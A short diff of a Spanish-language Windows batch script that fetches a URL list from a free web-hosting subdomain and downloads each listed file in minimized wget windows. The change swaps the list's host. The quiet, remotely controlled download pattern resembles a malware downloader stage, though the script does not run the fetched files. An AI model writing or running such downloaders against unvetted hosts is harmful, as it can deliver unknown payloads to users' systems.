@@ -2,7 +2,7 @@
 title Descargando utilidades
 mode con:lines=4 cols=52
 echo Obteninedo lista
-wget http://arte-tian-cuba.000webhostapp.com/net/PC.txt
+wget http://myrincon-cuba.000webhostapp.com/net/PC.txt
 for /f "delims= " %%i in (PC.txt) do (
 start /MIN wget %%i
 )
